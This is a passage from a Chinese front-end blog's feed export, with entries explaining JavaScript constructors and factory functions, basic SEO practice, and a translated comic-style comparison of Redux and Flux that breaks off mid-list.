<p>我还是喜欢分布式系统，而且我还是觉得微服务是一个解决组织问题的好方法。但是，当我们把失败看作“边缘案例”或者我们认为不可能发生的事时，问题就出现了。在一定范围内，这些边缘案例成为新常态，我们应该加以应对。</p>
<p>原文链接：</p>
<p><a href="https://world.hey.com/joaoqalves/disasters-i-ve-seen-in-a-microservices-world-a9137a51">https://world.hey.com/joaoqalves/disasters-i-ve-seen-in-a-microservices-world-a9137a51</a></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>构造函数</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>JavaScript 中的构造函数和其它语言中的构造函数是不同的。 通过 <code>new</code> 关键字方式调用的函数都被认为是构造函数。</p>
<p>在构造函数内部 - 也就是被调用的函数内 - <code>this</code> 指向新创建的对象 <code>Object</code>。 这个<strong>新创建</strong>的对象的 <code>prototype</code>被指向到构造函数的 <code>prototype</code>。</p>
<p>如果被调用的函数没有显式的 <code>return</code> 表达式，则隐式的会返回 <code>this</code> 对象 - 也就是新创建的对象。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">    this.bla &#x3D; 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Foo.prototype.test &#x3D; function() &#123;</span><br><span class="line">    console.log(this.bla);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var test &#x3D; new Foo();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面代码把 <code>Foo</code> 作为构造函数调用，并设置新创建对象的 <code>prototype</code> 为 <code>Foo.prototype</code>。</p>
<p>显式的 <code>return</code> 表达式将会影响返回结果，但<strong>仅限</strong>于返回的是一个对象。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Bar() &#123;</span><br><span class="line">    return 2;</span><br><span class="line">&#125;</span><br><span class="line">new Bar(); &#x2F;&#x2F; 返回新创建的对象</span><br><span class="line"></span><br><span class="line">function Test() &#123;</span><br><span class="line">    this.value &#x3D; 2;</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">        foo: 1</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">new Test(); &#x2F;&#x2F; 返回的对象</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>new Bar()</code> 返回的是新创建的对象，而不是数字的字面值 2。 因此 <code>new Bar().constructor === Bar</code>，但是如果返回的是数字对象，结果就不同了，如下所示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Bar() &#123;</span><br><span class="line">    return new Number(2);</span><br><span class="line">&#125;</span><br><span class="line">new Bar().constructor &#x3D;&#x3D;&#x3D; Number</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>**这里得到的 <code>new Test()</code>是函数返回的对象，而不是通过<code>new</code>关键字新创建的对象，因此：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(new Test()).value &#x3D;&#x3D;&#x3D; undefined</span><br><span class="line">(new Test()).foo &#x3D;&#x3D;&#x3D; 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果 <code>new</code> 被遗漏了，则函数<strong>不会</strong>返回新创建的对象。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">    this.bla &#x3D; 1; &#x2F;&#x2F; 获取设置全局参数</span><br><span class="line">&#125;</span><br><span class="line">Foo(); &#x2F;&#x2F; undefined</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>虽然上例在有些情况下也能正常运行，但是由于 JavaScript 中 <code>this</code>的工作原理， 这里的 <code>this</code> 指向<em>全局对象</em>。</p>
<h3 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h3><p>为了不使用 <code>new</code> 关键字，构造函数必须显式的返回一个值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Bar() &#123;</span><br><span class="line">    var value &#x3D; 1;</span><br><span class="line">    return &#123;</span><br><span class="line">        method: function() &#123;</span><br><span class="line">            return value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Bar.prototype &#x3D; &#123;</span><br><span class="line">    foo: function() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">new Bar();</span><br><span class="line">Bar();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面两种对 <code>Bar</code> 函数的调用返回的值完全相同，一个新创建的拥有 <code>method</code> 属性的对象被返回， 其实这里创建了一个闭包。</p>
<p>还需要注意， <code>new Bar()</code> 并<strong>不会</strong>改变返回对象的原型（也就是返回对象的原型不会指向 <code>Bar.prototype</code>）。 因为构造函数的原型会被指向到刚刚创建的新对象，而这里的 <code>Bar</code> 没有把这个新对象返回：而是返回了一个包含 <code>method</code> 属性的自定义对象）。</p>
<p>在上面的例子中，使用或者不使用 <code>new</code> 关键字没有功能性的区别。</p>
<p>上面两种方式创建的对象不能访问 <code>Bar</code> 原型链上的属性，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var bar1 &#x3D; new Bar();</span><br><span class="line">typeof(bar1.method); &#x2F;&#x2F; &quot;function&quot;</span><br><span class="line">typeof(bar1.foo); &#x2F;&#x2F; &quot;undefined&quot;</span><br><span class="line"></span><br><span class="line">var bar2 &#x3D; Bar();</span><br><span class="line">typeof(bar2.method); &#x2F;&#x2F; &quot;function&quot;</span><br><span class="line">typeof(bar2.foo); &#x2F;&#x2F; &quot;undefined&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="通过工厂模式创建新对象"><a href="#通过工厂模式创建新对象" class="headerlink" title="通过工厂模式创建新对象"></a>通过工厂模式创建新对象</h3><p>我们常听到的一条忠告是<strong>不要</strong>使用 <code>new</code> 关键字来调用函数，因为如果忘记使用它就会导致错误。</p>
<p>为了创建新对象，我们可以创建一个工厂方法，并且在方法内构造一个新对象。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">    var obj &#x3D; &#123;&#125;;</span><br><span class="line">    obj.value &#x3D; &#39;blub&#39;;</span><br><span class="line"></span><br><span class="line">    var private &#x3D; 2;</span><br><span class="line">    obj.someMethod &#x3D; function(value) &#123;</span><br><span class="line">        this.value &#x3D; value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    obj.getPrivate &#x3D; function() &#123;</span><br><span class="line">        return private;</span><br><span class="line">    &#125;</span><br><span class="line">    return obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>虽然上面的方式比起 <code>new</code> 的调用方式不容易出错，并且可以充分利用<code>私有变量</code>带来的便利， 但是随之而来的是一些不好的地方。</p>
<ol>
<li> 会占用更多的内存，因为新创建的对象<strong>不能</strong>共享原型上的方法。</li>
<li> 为了实现继承，工厂方法需要从另外一个对象拷贝所有属性，或者把一个对象作为新创建对象的原型。</li>
<li> 放弃原型链仅仅是因为防止遗漏 <code>new</code> 带来的问题，这似乎和语言本身的思想相违背。</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>虽然遗漏 <code>new</code> 关键字可能会导致问题，但这并<strong>不是</strong>放弃使用原型链的借口。 最终使用哪种方式取决于应用程序的需求，选择一种代码书写风格并<strong>坚持</strong>下去才是最重要的。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>每个程序员必知之SEO</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E6%AF%8F%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E5%BF%85%E7%9F%A5%E4%B9%8BSEO/</url>
    <content><![CDATA[<h1 id="搜索引擎是如何工作的"><a href="#搜索引擎是如何工作的" class="headerlink" title="搜索引擎是如何工作的"></a>搜索引擎是如何工作的</h1><blockquote>
<p>如果你有时间，可以读一下谷歌的框架：</p>
</blockquote>
<p><a href="http://infolab.stanford.edu/~backrub/google.html">http://infolab.stanford.edu/~backrub/google.html</a></p>
<blockquote>
<p>这是一个老的，有些过时纸，但非常平易近人，甚至在我们中间的非白皮书的读者图标微笑什么每个程序员都应该知道的关于搜索引擎优化和他们绝对概念的解释更详细，我只提一笔带过。</p>
</blockquote>
<h2 id="搜索时发生什么了"><a href="#搜索时发生什么了" class="headerlink" title="搜索时发生什么了"></a>搜索时发生什么了</h2><ul>
<li>  用户输入查询内容</li>
<li>  查询处理以及分词技术</li>
<li>  确定搜索意图及返回相关、新鲜的内容</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-baf593c80e1a6181.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h1 id="为什么需要SEO"><a href="#为什么需要SEO" class="headerlink" title="为什么需要SEO"></a>为什么需要SEO</h1><p>这是一个有趣的问题，答案总会来源于<code>为网站带来更多的流量</code>。</p>
<h2 id="爬虫与索引"><a href="#爬虫与索引" class="headerlink" title="爬虫与索引"></a>爬虫与索引</h2><p>我们先看看来自谷歌的爬虫工作的一点内容</p>
<blockquote>
<p>抓取是 Googlebot 发现新网页并更新这些网页以将网页添加到 Google 索引中的过程。</p>
<p>我们使用许多计算机来获取（或”抓取”）网站上的大量网页。执行获取任务的程序叫做 Googlebot（也被称为漫游器或信息采集软件）。Googlebot 使用算法来进行抓取：计算机程序会确定要抓取的网站、抓取频率以及从每个网站中获取的网页数量。</p>
<p>Google 的抓取过程是根据网页网址的列表进行的，该列表是在之前进行的抓取过程中形成的，且随着网站管理员所提供的站点地图数据不断进行扩充。Googlebot 在访问每个网站时，会检测每个网页上的链接，并将这些链接添加到它要抓取的网页列表中。新建立的网站、对现有网站所进行的更改以及无效链接都会被记录下 来，并用于更新 Google 索引。</p>
</blockquote>
<p>也就是如原文所说:</p>
<blockquote>
<p>谷歌的爬虫(又或者说蛛蛛)能够抓取你整个网站索引的所有页。</p>
</blockquote>
<p><strong>为什么谷歌上可以搜索整个互联网的内容</strong>？因为，他解析并存储了。而更有意思的是，他会为同样的内容建立一个索引或者说分类，按照一定的相关性，针对于某个关键词的内容。</p>
<p>PageRank对于一个网站来说是相当重要的，只是这个相比也比较复杂。包括其他网站链接向你的网站，以及流量，当然还有域名等等。</p>
<h3 id="什么样的网站需要SEO？"><a href="#什么样的网站需要SEO？" class="headerlink" title="什么样的网站需要SEO？"></a>什么样的网站需要SEO？</h3><p>下图是我的博客的流量来源</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-246afc710a7a5bef.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="What Site Need SEO"></p>
<figcaption style="box-sizing: border-box;">What Site Need SEO</figcaption>

<p>正常情况下除了像<code>腾讯</code>这类的<code>QQ空间</code>自我封闭的网站外都需要SEO，或者不希望泄露一些用户隐私如<code>Facebook</code>、<code>人人</code>等等</p>
<ul>
<li>  如果你和我的网站一样需要靠搜索带来流量</li>
<li>  如果你只有很少的用户访问，却有很多的内容。</li>
<li>  如果你是为一个公司、企业工作为以带来业务。</li>
<li>  。。。</li>
</ul>
<h2 id="SEO与编程的不同之处"><a href="#SEO与编程的不同之处" class="headerlink" title="SEO与编程的不同之处"></a>SEO与编程的不同之处</h2><p>SEO与编程的最大不同之处在于</p>
<h3 id="编程的核心是技术，SEO的核心是内容。"><a href="#编程的核心是技术，SEO的核心是内容。" class="headerlink" title="编程的核心是技术，SEO的核心是内容。"></a>编程的核心是技术，SEO的核心是内容。</h3><p>内容才是SEO最重要的组成部分，这也就是腾讯复制不了的东西。</p>
<h1 id="SEO基础知识"><a href="#SEO基础知识" class="headerlink" title="SEO基础知识"></a>SEO基础知识</h1><h2 id="确保网站是可以被索引的"><a href="#确保网站是可以被索引的" class="headerlink" title="确保网站是可以被索引的"></a>确保网站是可以被索引的</h2><p>一些常见的页面不能被访问的原因</p>
<ul>
<li>  隐藏在需要提交的表格中的链接</li>
<li>  不能解析的JavaScript脚本中的链接</li>
<li>  Flash、Java和其他插件中的链接</li>
<li>  PowerPoint和PDF文件中的链接</li>
<li>  指向被meta Robtots标签、rel=”NoFollow”和robots.txt屏蔽的页面的链接</li>
<li>  页面上有上几百个链接</li>
<li>  frame(框架结构)和iframe里的链接</li>
</ul>
<p>对于现在的网站来还有下面的原因，通过来说是因为内容是动态生成的，而不是静态的</p>
<ul>
<li>  网站通过WebSocket的方法渲染内容</li>
<li>  使用诸如Mustache之类的JS模板引擎</li>
</ul>
<h2 id="什么样的网页可以被索引"><a href="#什么样的网页可以被索引" class="headerlink" title="什么样的网页可以被索引"></a>什么样的网页可以被索引</h2><ul>
<li>  确保页面可以在没有JavaScript下能被渲染。对于现在JavaScript语言的使用越来越多的情况下，在使用JS模板引擎的时候也应该注意这样的问题。</li>
<li>  在用户禁用了JavaScript的情况下，保证所有的链接和页面是可以访问的。</li>
<li>  确保爬虫可以看到所有的内容。那些用JS动态加载出来的对于爬虫来说是不友好的</li>
<li>  使用描述性的锚文本的网页</li>
<li>  限制的页面上的链接数量。除去一些分类网站、导航网站之类有固定流量，要不容易被认为垃圾网站。</li>
<li>  确保页面能被索引。有一指向它的URL</li>
<li>  URL应该遵循最佳实践。如blog/how-to-driver有更好的可读性</li>
</ul>
<h2 id="在正确的地方使用正确的关键词"><a href="#在正确的地方使用正确的关键词" class="headerlink" title="在正确的地方使用正确的关键词"></a>在正确的地方使用正确的关键词</h2><ul>
<li>  把关键词放URL中</li>
<li>  关键词应该是页面的标签</li>
<li>  带有H1标签</li>
<li>  图片文件名、ALT属性带有关键词。</li>
<li>  页面文字</li>
<li>  加粗文字</li>
<li>  Descripiton标签</li>
</ul>
<h1 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h1><p>对于技术博客而言，内容才是最需要考虑的因素。</p>
<p>可以考虑一下这篇文章，虽然其主题是以SEO为主 <a href="http://www.phodal.com/blog/user-experience-writing-web-content/">用户体验与网站内容</a></p>
<p>不可忽略的一些因素是内容才是最优质的部分，没有内容一切SEO都是无意义的。</p>
<h2 id="复制内容问题"><a href="#复制内容问题" class="headerlink" title="复制内容问题"></a>复制内容问题</h2><p>一个以用户角度考虑的问题</p>
<h3 id="用户需要看到多元化的搜索结果"><a href="#用户需要看到多元化的搜索结果" class="headerlink" title="用户需要看到多元化的搜索结果"></a>用户需要看到多元化的搜索结果</h3><p>所以对于搜索引擎来说，复制带来的结果：</p>
<ul>
<li>  搜索引擎爬虫对每个网站都有设定的爬行预算，每一次爬行都只能爬行trpgr页面数</li>
<li>  连向复制内容页面的链接也浪费了它们的链接权重。</li>
<li>  没有一个搜索引擎详细解释他们的算法怎样选择显示页面的哪个版本。</li>
</ul>
<p>于是上文说到的作者给了下面的这些建议:</p>
<blockquote>
<p>避免从网上复制的内容（除非你有很多其他的内容汇总，以使它看起来不同 - 我们做头条，对我们的产品页面的新闻片段的方式） 。这当然强烈适用于在自己的网站页面以及。内容重复可以混淆搜索引擎哪些页面是权威（它也可能会导致罚款，如果你只是复制粘贴别人的内容也行） ，然后你可以有你自己的网页互相竞争排名！</p>
<p>如果你必须有重复的内容，利用相对=规范，让搜索引擎知道哪个URL是一个他们应该被视为权威。但是，如果你的页面是另一个在网络上找到一个副本？那么开始想出一些策略来增加更多的文字和信息来区分你的网页，因为这样重复的内容是决不可能得到好的排名。</p>
</blockquote>
<p>——待续。</p>
<h1 id="保持更新"><a href="#保持更新" class="headerlink" title="保持更新"></a>保持更新</h1><p>谷歌对于一个一直在更新的博客来说会有一个好的排名，当然只是相对的。</p>
<p>对于一个技术博客作者来说，一直更新的好处不仅可以让我们不断地学习更多的内容。也可以保持一个良好的习惯，而对于企业来说更是如此。如果我们每天去更新我们的博客，那么搜索引擎对于我们网站的收录也会变得越来越加频繁。那么，对于我们的排名及点击量来说也算是一个好事，当我们可以获得足够的排名靠前时，我们的PR值也在不断地提高。</p>
<p>更多内容可以参考:<a href="http://www.seomoz.org/blog/google-fresh-factor">Google Fresh Factor</a></p>
<h1 id="网站速度"><a href="#网站速度" class="headerlink" title="网站速度"></a>网站速度</h1><blockquote>
<p>谷歌曾表示在他们的算法页面加载速度问题，所以一定要确保你已经调整您的网站，都服从最佳做法，以使事情迅速</p>
</blockquote>
<p>过去的一个月里，我试着提高自己的网站的速度，有一个相对好的速度，但是受限于<code>域名解析速度</code>以及<code>VPS</code>。</p>
<p><a href="http://www.phodal.com/blog/use-traceroute-analyse-person-homepage-speed/">网站速度分析与traceroute</a></p>
<p><a href="http://www.phodal.com/blog/ux-and-improve-website-load-speed/">UX与网站速度优化——博客速度优化小记</a></p>
<p><a href="http://www.phodal.com/blog/nginx-with-ngx-pagespeed-module-improve-website-cache/">Nginx ngx_pagespeed nginx前端优化模块编译</a></p>
<h1 id="保持耐心"><a href="#保持耐心" class="headerlink" title="保持耐心"></a>保持耐心</h1><blockquote>
<p>这是有道理的，如果你在需要的谷歌机器人抓取更新的页面，然后处理每一个页面，并更新与新内容对应的索引的时间因素。</p>
<p>而这可能是相当长一段时间，当你正在处理的内容PB级。</p>
</blockquote>
<p>SEO是一个长期的过程，很少有网站可以在短期内有一个很好的位置，除非是一个热门的网站，然而在它被发现之前也会一个过程。</p>
<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>在某种意义上，这个是提高PR值，及网站流量的另外一个核心，除了内容以外的核心。</p>
<ul>
<li>  链接建设是SEO的基础部分。除非你有一个异常强大的品牌，不需要干什么就能吸引到链接。</li>
<li>  链接建设永不停止。这是不间断营销网站的过程</li>
</ul>
<p>关于链接的内容有太多，而且当前没有一个好的方法获取链接虽然在我的网站已经有了</p>
<p>Links to Your Site</p>
<p>Total links</p>
<p><code>5,880</code></p>
<blockquote>
<p>同时寻求更多的链接是更有利更相关的链接可以帮助一样多。如果你有你的内容的分销合作伙伴，或者你建立一个小工具，或其他任何人都会把链接回你的网站在网络上 - 你可以通过确保各个环节都有最佳的关键字锚文本大大提高链路的相关性。您还应该确保所有链接到您的网站指向你的主域（ <a href="http://www.yourdomain.com/">http://www.yourdomain.com</a> ，像<a href="http://widget.yourdomain.com不是一个子域)/">http://widget.yourdomain.com不是一个子域）</a> 。另外，你要尽可能多的联系，以包含适当的替代文字。你的想法。</p>
<p>另外，也许不太明显的方式，建立链接（或者至少流量）是使用社交媒体 - 所以设置你的Facebook ，Twitter和谷歌，每当你有新的链接一定要分享。这些通道也可以作为一个有效的渠道，推动更多的流量到您的网站。</p>
</blockquote>
<p>由社交渠道带来的流量在现在已经越来越重要了，对于一些以内容为主导的网站，而且处于发展初期，可以迅速带来流量，可以参考一下这篇文章</p>
<p><a href="http://www.phodal.com/blog/xunta-analytics-and-website-content/">寻ta分析与网站内容</a></p>
<p>一些更简单的办法就是交换链接，总之这个话题有些沉重，可能会带来一些负面的影响，如黑帽SEO。。。。</p>
<p><strong>参考来源</strong>:</p>
<p>《SEO艺术》(The Art of SEO)</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>看漫画，学 Redux</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E7%9C%8B%E6%BC%AB%E7%94%BB%EF%BC%8C%E5%AD%A6Redux/</url>
    <content><![CDATA[<p>前言</p>
<p>经常看react文章的时候会看到这两个词Redux和Flux。今天就先来看看由@jasonslyvia带来的这篇Redux的文章。</p>
<p>正文从这开始～</p>
<p>Flux 架构已然让人觉得有些迷惑，而比 Flux 更让人摸不着头脑的是 Flux 与 Redux 的区别。Redux 是一个基于 Flux 思想的新架构方式，本文将探讨它们的区别。</p>
<p><strong>为什么要改变 Flux？</strong></p>
<p>Redux 解决的问题和 Flux 一样，但 Redux 能做的还有更多。</p>
<p>和 Flux 一样，Redux 让应用的状态变化变得更加可预测。如果你想改变应用的状态，就必须 dispatch 一个 action。你没有办法直接改变应用的状态，因为保存这些状态的东西（称为 store）只有 getter 而没有 setter。对于 Flux 和 Redux 来说，这些概念都是相似的。</p>
<p>那么为什么要新设计一种架构呢？Redux 的创造者 Dan Abramov 发现了改进 Flux 架构的可能。他想要一个更好的开发者工具来调试 Flux 应用。他发现如果稍微对 Flux 架构进行一些调整，就可以开发出一款更好用的开发者工具，同时依然能享受 Flux 架构带给你的可预测性。</p>
<p>确切的说，他想要的开发者工具包含了代码热替换（hot reload）和时间旅行（time travel）功能。然而要想在 Flux 架构上实现这些功能，确实有些麻烦。</p>
<p><strong>问题1：store 的代码无法被热替换，除非清空当前的状态</strong></p>
<p>在 Flux 中，store 包含了两样东西：</p>
<ul>
<li><p>  改变状态的逻辑</p>
</li>
<li><p>  当前的状态</p>
</li>
</ul>
<p>在一个 store 中同时保存这两样东西将会导致代码热替换功能出现问题。当你热替换掉 store 的代码想要看看新的状态改变逻辑是否生效时，你就丢失了 store 中保存的当前状态。此外，你还把 store 与 Flux 架构中其它组件产生关系的事件系统搞乱了。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-5aad1c497e0386b0?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>解决方案</p>
<p>将这两样东西分开处理。让一个对象来保存状态，这个对象在热替换代码的时候不会受到影响。让另一个对象包含所有改变状态的逻辑，这个对象可以被热替换因为它不用关心任何保存状态相关的事情。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-e408496161ee7ef5?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><strong>问题2：每次触发 action 时状态对象都被直接改写了</strong></p>
<p>时间旅行调试法的特性是：你能掌握状态对象的每一次变化，这样的话，你就能轻松的跳回到这个对象之前的某个状态（想象一个撤销功能）。</p>
<p>要实现这样的功能，每次状态改变之后，你都需要把旧的状态保存在一个数组中。但是由于 JavaScript 的对象引用特性，简单的把一个对象放进数组中并不能实现我们需要的功能。这样做不能创建一个快照（snapshot），而只是创建了一个新的指针指向同一个对象。</p>
<p>所以要想实现时间旅行特性，每一个状态改变的版本都需要保存在不同的 JavaScript 对象中，这样你才不会不小心改变了某个历史版本的状态。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-4299f3d05bba1a15?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>解决方案</p>
<p>当一个 action 需要 store 响应时，不要直接修改 store 中的状态，而是将状态拷贝一份并在这份拷贝的状态上做出修改。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-f358578e4feb2fb1?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><strong>问题3：没有合适的位置引入第三方插件</strong></p>
<p>当你在写一些调试性工具时，你希望它们能够更加通用。一个使用该工具的用户应该可以直接引入这个工具而不需要做额外的包装或桥接。</p>
<p>要实现这样的特性，Flux 架构需要一个扩展点。</p>
<p>一个简单的例子就是日志。比如说你希望console.log() 每一个触发的 action 同时 console.log() 这个 action 被响应完成后的状态。在 Flux 中，你只能订阅（subscribe） dispatcher 的更新和每一个 store 的变动。但是这样就侵入了业务代码，这样的日志功能不是一个第三方插件能够轻易实现的。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-1144bdb327d2829e?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>解决方案</p>
<p>将这个架构的部分功能包装进其他的对象中将使得我们的需求变得更容易实现。这些「其他对象」在架构原有的功能基础之上添加了自己的功能。你可以把这种扩展点看做是一个增强器（enhancers）或者高阶对象（higher order objects），亦或者中间件（middleware）。</p>
<p>此外，使用一个树形结构来组织所有改变状态的逻辑，这样当状态发生改变的时候 store 只会触发一个事件来通知视图层（view），而这一个事件会被整棵树中的所有逻辑处理（译者注：「处理」不代表一定会改变状态，这些改变状态的逻辑本质上是函数，函数内部会根据 action 的类型等来确定是否对状态进行改变）。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-4d59819f9b748ce0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>*注意：就上述这些问题和解决方案来说，我主要在关注开发者工具这一使用场景。实际上，对 Flux 做出的这些改变在其他场景中也非常有帮助。在上述三点之外，Flux 和 Redux 还有更多的不同点。比如，相比于 Flux，Redux 精简了整个架构的冗余代码，并且复用 store 的逻辑变得更加简单。这里有一个 Redux 优点的列表可供参考。</p>
<p>那么让我们来看看 Redux 是怎么让这些特性变为现实的。</p>
<p><strong>新的角色</strong></p>
<p>从 Flux 演进到 Redux，整个架构中的角色发生了些许的变化。</p>
<p>Action creators</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-e673e016fe178b98?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>Redux 保留了 Flux 中 action creator 的概念。每当你想要改变应用中的状态时，你就要 dispatch 一个 action，这也是唯一改变状态的方法。</p>
<p>就像我在这篇关于 Flux 的文章中提到的一样，我把 action creator 看做是一个报务员（负责发电报的人，telegraph operator），你找到 action creator 告诉他你大致上想要传达什么信息，action creator 则会把这些信息格式化为一种标准的格式，以便系统中的其他部分能够理解。</p>
<p>与 Flux 不同的是，Redux 中的 action creator 不会直接把 action 发送给 dispatcher，而是返回一个格式化好的 JavaScript 对象。</p>
<p>The store</p>
<p>我把 Flux 中的 store 描述为一种过度控制的官僚机制。不能简单直接的修改状态，而是要求所有的状态改变都必须由store 亲自产生，还必须要经历 action 分发那种套路。在 Redux 中，store 依然是这么的充满控制欲和官僚主义，但是又有些不一样。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-88aac50cd3b2ba18?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>在 Flux 中，你可以拥有多个 store，每一个 store 都有自己的统治权。每个 store 都保存着自己对应的那部分状态，以及所有修改这些状态的逻辑。</p>
<p>而 Redux 中的 store 更喜欢将权力下放，而且不得不这么做。因为在 Redux 中，你只能有一个 store……所以如果你打算像 Flux 那样 store 完全独立处理自己的事情，那么 Redux 中的 store 将变得工作量巨大。</p>
<p>因此，Redux 中的 store 首先会保存整个应用的所有状态，然后将判断哪一部分状态需要改变的任务分配下去。而以根reducer（root reducer）为首的 reducer 们将会承担这个任务。</p>
<p>你可能发现这里好像没有dispatcher 什么事，看起来有点越权，但 store 已经完全接管了 dispatch 相关的工作。</p>
<p>The reducers</p>
<p>当 store 需要知道一个 action 触发后状态需要怎么改变时，他会去询问 reducer。根 reducer 会根据状态对象的键（key）将整个状态树进行拆分，然后将拆分后的每一块子状态传到知道该怎么响应的子 reducer 那里进行处理。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-af7350b35b25cf72.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>我把 reducers 看做是有点格外热衷复印的白领。他们不希望把任何事搞砸，因此他们不会修改任何传递给他们的文件。取而代之的是，他们会对这些文件进行复印，然后在复印件上进行修改。（译者注：当然，当这些修改后的复印件定稿后，他们也不会再去修改这些复印件。）</p>
<p>这是 Redux 的核心思想之一。不直接修改整个应用的状态树，而是将状态树的每一部分进行拷贝并修改拷贝后的部分，然后将这些部分重新组合成一颗新的状态树。</p>
<p>子 reducers 会把他们创建的副本传回给根 reducer，而根 reducer 会把这些副本组合起来形成一颗新的状态树。最后根 reducer 将新的状态树传回给 store，store 再将新的状态树设为最终的状态。</p>
<p>如果你有一个小型应用，你可能只有一个reducer 对整个状态树进行拷贝并作出修改。又或者你有一个超大的应用，你可能会有若干个 reducers 对整个状态树进行修改。这也是 Flux 和 Redux 的另一处区别。在 Flux 中，store 并不需要与其他 store 产生关联，而且 store 的结构是扁平的。而在 Redux 中，reducers 是有层级结构的。这种层级结构可以有若干层，就像组件的层级结构那样。</p>
<p>The views: 智能组件（smart components）和木偶组件(dumb components)</p>
<p>Flux 拥有控制型视图（controller views） 和常规型视图（regular views）。控制型视图就像是一个经理一样，管理着 store 和子视图（child views）之间的通信。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-b3a89829aa350800?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>在 Redux 中，也有一个类似的概念：智能组件和木偶组件。（译者注：在最新的 Redux 文档中，它们分别叫做容器型组件 Container component 和展示型组件 Presentational component）智能组件的职责就像经理一样，但是比起Flux 中的角色，Redux 对经理的职责有更多的定义：</p>
<ul>
<li><p>  智能组件负责所有的 action。如果智能组件里包含的一个木偶组件需要触发一个 action，智能组件会通过 props 传给一个 function 给木偶组件，而木偶组件可以把这个 function 当做一个回调。</p>
</li>
<li><p>  智能组件不能定义 CSS 样式。</p>
</li>
<li><p>  智能组件几乎不会产生自己的 DOM 节点，他的工作是组织若干的木偶组件，由木偶组件来生成最终的 DOM 节点。</p>
</li>
</ul>
<p>木偶组件不会直接依赖 action 的触发，因为所有的 action 都会当做 props 传下来。这意味着木偶组件可以被任何一个逻辑不同的 App 拿去使用。同时木偶组件也需要有一定的样式来让自己变得好看一些（当然你可以让木偶组件接受某些 props 作为设置样式的变量）。</p>
<p><strong>视图层绑定</strong></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-a3584facccad4b62?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>要把 store 绑定到视图上，Redux 需要一点帮助。如果你在使用 React，那么你需要使用 react-redux。</p>
<p>视图绑定工作有点像为组件树服务的 IT 部门。IT 部门确保所有的组件都正确的绑定到 store 上，并处理各种技术上的细节，以确保余下层级的组件对绑定相关的操作毫无感知。</p>
<p>视图层绑定引入了三个概念：</p>
<ul>
<li><p>  <Provider> 组件： 这个组件需要包裹在整个组件树的最外层。这个组件让根组件的所有子孙组件能够轻松的使用 connect() 方法绑定 store。</p>
</li>
